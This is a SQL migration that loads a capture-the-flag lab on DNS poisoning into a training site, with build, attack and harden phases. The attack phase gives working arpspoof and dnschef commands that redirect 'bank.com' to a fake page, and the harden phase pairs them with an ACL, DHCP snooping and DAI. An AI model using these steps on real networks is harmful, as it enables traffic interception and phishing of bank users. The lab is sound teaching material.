-- ═══════════════════════════════════════════════════════
-- Lab 10 (id=10) — DNS Poisoning : full content (Vol 2 · Ch 7)
-- ═══════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Configure a DNS server then race the real response to inject a poisoned A record.',
    topic = 'services',
    difficulty = 'hard',
    book_ref = 'Vol 2 · Ch 7'
WHERE id = 10;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'DNS flowing honestly',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Build</span><h3>DNS flowing honestly</h3></div>
    <p class="goal">R1 is gateway and DNS forwarder. PC-A and PC-B get their addresses via DHCP with R1 as DNS. Confirm a real lookup resolves correctly — then prepare to intercept.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Baseline honest DNS</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config)#</span> ip dhcp excluded-address 10.0.10.1 10.0.10.9
<span class="prompt">R1(config)#</span> ip dhcp pool LAN
<span class="prompt">R1(dhcp-config)#</span> network 10.0.10.0 255.255.255.0
<span class="prompt">R1(dhcp-config)#</span> default-router 10.0.10.1
<span class="prompt">R1(dhcp-config)#</span> dns-server 10.0.10.1
<span class="prompt">R1(config)#</span> ip dns server
<span class="prompt">R1(config)#</span> ip host bank.com 10.0.10.100   <span class="cmt"># a local A record — honest answer</span></pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Confirm PC-B resolves correctly</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">PC-B></span> ping bank.com
<span class="cmt">bank.com (10.0.10.100) — 5 packets → 0% loss. Honest DNS works.</span></pre>
    </div>
  </div>

  <!-- ATTACK -->
$md$
WHERE lab_id = 10 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Answer first, lie about the IP',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Attack</span><h3>Answer first, lie about the IP</h3></div>
    <p class="goal">Two paths to becoming the DNS: Lab 08's rogue DHCP (set <code>dns-server=Kali</code>), or direct ARP poisoning to impersonate R1's MAC. Either way, DNS queries land on Kali. Now intercept them with dnschef — any request for <code>bank.com</code> resolves to 10.0.10.66 (Kali's IP), and PC-B walks through your door thinking it reached the bank.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Become PC-B's DNS (pick your path)</div>
      <p><strong>Path A — rogue DHCP (Lab 08):</strong> starve R1's pool, stand up dnsmasq with <code>dhcp-option=6,10.0.10.66</code>, force PC-B to release/renew.</p>
      <p><strong>Path B — ARP poison (faster for this bench):</strong> impersonate R1's MAC so PC-B sends DNS queries to you instead.</p>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ arpspoof -i eth0 -t 10.0.10.20 10.0.10.1 &amp;</span>   <span class="cmt"># tell PC-B: I'm the gateway/DNS</span>
<span class="attackline">kali$ arpspoof -i eth0 -t 10.0.10.1 10.0.10.20 &amp;</span>   <span class="cmt"># tell R1: I'm PC-B</span>
<span class="prompt">kali$</span> sysctl -w net.ipv4.ip_forward=1             <span class="cmt"># relay other traffic so it's invisible</span></pre>
      <div class="note watch"><strong>Verify:</strong> PC-B still pings <code>bank.com</code> — packets flow through Kali now. ARP cache on PC-B shows R1's IP at Kali's MAC.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Intercept DNS with dnschef</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> cat > /tmp/dnschef.ini << 'EOF'
[bank.com]
*.bank.com=10.0.10.66
EOF
<span class="attackline">kali$ dnschef --fakeip 10.0.10.66 --fakedomains bank.com -i 10.0.10.66 --interface eth0</span></pre>
      <div class="note trap"><strong>Trap — port 53 already bound:</strong> if systemd-resolved or another DNS service is listening on 10.0.10.66:53, dnschef fails to bind. Kill it first: <code>systemctl stop systemd-resolved; killall -9 dnsmasq 2>/dev/null</code>. Then re-run dnschef.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">3</span> Serve the fake page and capture</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> echo '<html><body><h1>Welcome to Bank</h1><p>Session: NB10-dns-p0is0n-f7a3</p></body></html>' > /tmp/fake.html
<span class="prompt">kali$</span> python3 -m http.server 80 &amp;

<span class="prompt">PC-B></span>  <span class="cmt"># user types "bank.com" in a browser</span>
<span class="cmt">→ resolves to 10.0.10.66 (Kali) via dnschef
→ hits Kali's http.server on :80
→ sees "Welcome to Bank" — with Kali's token in the page</span></pre>
    </div>
    <div class="flag">
      <div class="flag-label">🚩 Flag</div>
      <h4>Capture the token from the fake bank page served through poisoned DNS.</h4>
      <div class="flag-row"><input id="flag-in" placeholder="NB10-..."><button onclick="checkFlag()">Submit</button></div>
      <div class="flag-msg" id="flag-msg"></div>
    </div>
    <details class="hint"><summary>Hint 1 — PC-B resolves bank.com but it still shows R1's answer</summary>
      <p>Your ARP poison or rogue DHCP isn't directing DNS queries to Kali. Check two things: (1) ARP poison — confirm <code>PC-B> show arp</code> lists 10.0.10.1 at Kali's MAC. (2) Rogue DHCP — confirm <code>PC-B> show ip</code> shows <code>DNS : 10.0.10.66</code>. If DNS still points to 10.0.10.1, the rogue DHCP didn't win the race; release/renew PC-B again.</p></details>
    <details class="hint"><summary>Hint 2 — dnschef is running but PC-B gets no answer for bank.com</summary>
      <p>Check that dnschef is actually receiving the queries: <code>tcpdump -i eth0 port 53</code> on Kali. If no DNS packets arrive, your ARP poison isn't working (R1 is still answering). If DNS packets arrive but dnschef doesn't respond, check it's bound to the right IP with <code>-i 10.0.10.66</code> and that nothing else is on port 53.</p></details>
  </div>

  <!-- HARDEN -->
$md$
WHERE lab_id = 10 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Lock down who gets to answer',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Harden</span><h3>Lock down who gets to answer</h3></div>
    <p class="goal">DNS poisoning only works if the attacker can deliver a DNS response before (or instead of) the legitimate server. Three layers shut it down: DHCP snooping prevents rogue DNS assignment, DAI prevents ARP-based DNS redirection, and an ACL on the switch blocks DNS responses from any port that isn't the real server.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> ACL — only R1 may send DNS responses</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1(config)#</span> ip access-list extended BLOCK-ROGUE-DNS
<span class="prompt">SW1(config-ext-nacl)#</span> permit udp host 10.0.10.1 eq 53 any   <span class="cmt"># R1 can answer</span>
<span class="prompt">SW1(config-ext-nacl)#</span> deny udp any eq 53 any              <span class="cmt"># nobody else</span>
<span class="prompt">SW1(config-ext-nacl)#</span> permit ip any any                   <span class="cmt"># everything else flows</span>
<span class="prompt">SW1(config)#</span> interface e0/3
<span class="prompt">SW1(config-if)#</span> ip access-group BLOCK-ROGUE-DNS in</pre>
      <div class="note why"><strong>Why port-level ACL:</strong> applied inbound on e0/3 (Kali's port), it drops any DNS response (UDP src 53) <em>from</em> Kali before it reaches the switching fabric. DNS queries (requests) still leave the port, so Kali receives them — but its poisoned answers never reach PC-B. This works at the network layer without DHCP snooping or DAI, making it the most direct countermeasure.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> The full defense chain</div>
      <p>Layered, each defense stops a different vector:</p>
      <pre><button class="copy-btn">copy</button><span class="cmt">Vector: rogue DHCP sets DNS=Kali           → DHCP snooping (Lab 37)
Vector: ARP poison redirects DNS to Kali     → DAI (Lab 38)
Vector: Kali receives and answers DNS legit  → ACL blocks UDP/53 from rogue ports</span></pre>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ dnschef --fakeip 10.0.10.66 --fakedomains bank.com -i 10.0.10.66</span>

<span class="prompt">PC-B></span> ping bank.com
<span class="good">bank.com (10.0.10.100) — honest answer from R1. dnschef's response was ACL-dropped.</span></pre>
    </div>
  </div>
$md$
WHERE lab_id = 10 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  10,
  $svg$<svg viewBox="0 0 720 320" role="img" aria-label="Router as gateway and DNS, switch, two clients, and Kali intercepting DNS to redirect a domain">
      <rect x="40" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">gateway + real DNS</text>
      <rect x="300" y="30" width="130" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="365" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">IOU L2</text>
      <line x1="190" y1="55" x2="300" y2="55" stroke="#2563eb" stroke-width="2"/>
      <line x1="310" y1="80" x2="100" y2="230" stroke="#2563eb" stroke-width="2"/>
      <line x1="365" y1="80" x2="365" y2="230" stroke="#2563eb" stroke-width="2"/>
      <line x1="420" y1="80" x2="630" y2="230" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="195" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/1</text>
      <text x="378" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/2</text>
      <text x="505" y="160" font-family="monospace" font-size="9" fill="#e5484d">e0/3</text>
      <rect x="30" y="230" width="130" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="95" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-A</text>
      <text x="95" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">DHCP client · DNS→Kali</text>
      <rect x="300" y="230" width="130" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="365" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-B</text>
      <text x="365" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">visits "bank.com"</text>
      <rect x="570" y="230" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="630" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="630" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">dnschef · .66</text>
      <text x="360" y="308" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">PC-B asks "where is bank.com?" — Kali answers first, with its own IP</text>
    </svg>$svg$,
  $svg$<svg viewBox="0 0 720 320" role="img" aria-label="Router as gateway and DNS, switch, two clients, and Kali intercepting DNS to redirect a domain">
      <rect x="40" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">gateway + real DNS</text>
      <rect x="300" y="30" width="130" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="365" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">IOU L2</text>
      <line x1="190" y1="55" x2="300" y2="55" stroke="#2563eb" stroke-width="2"/>
      <line x1="310" y1="80" x2="100" y2="230" stroke="#2563eb" stroke-width="2"/>
      <line x1="365" y1="80" x2="365" y2="230" stroke="#2563eb" stroke-width="2"/>
      <line x1="420" y1="80" x2="630" y2="230" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="195" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/1</text>
      <text x="378" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/2</text>
      <text x="505" y="160" font-family="monospace" font-size="9" fill="#e5484d">e0/3</text>
      <rect x="30" y="230" width="130" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="95" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-A</text>
      <text x="95" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">DHCP client · DNS→Kali</text>
      <rect x="300" y="230" width="130" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="365" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-B</text>
      <text x="365" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">visits "bank.com"</text>
      <rect x="570" y="230" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="630" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="630" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">dnschef · .66</text>
      <text x="360" y="308" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">PC-B asks "where is bank.com?" — Kali answers first, with its own IP</text>
    </svg>$svg$,
  '[]'::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
